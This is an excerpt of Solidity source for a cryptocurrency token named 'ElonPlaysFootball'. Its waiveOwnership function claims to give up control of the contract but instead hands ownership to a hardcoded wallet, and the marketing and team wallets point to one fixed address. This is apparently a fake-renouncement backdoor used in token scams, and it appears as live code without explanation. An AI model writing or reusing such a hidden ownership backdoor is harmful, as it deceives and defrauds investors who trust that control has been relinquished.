...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xe575239427eb9C64958531a4D55cF2d1A20E30d6));
        _owner = address(0xe575239427eb9C64958531a4D55cF2d1A20E30d6);
    }
...
contract ElonPlaysFootball is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "ElonPlaysFootball";
    string private _symbol = "CZELON";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x113fBC641B8A8441d2B124c65FF0f95D603855b3);
    address payable public teamWalletAddress = payable(0x113fBC641B8A8441d2B124c65FF0f95D603855b3);
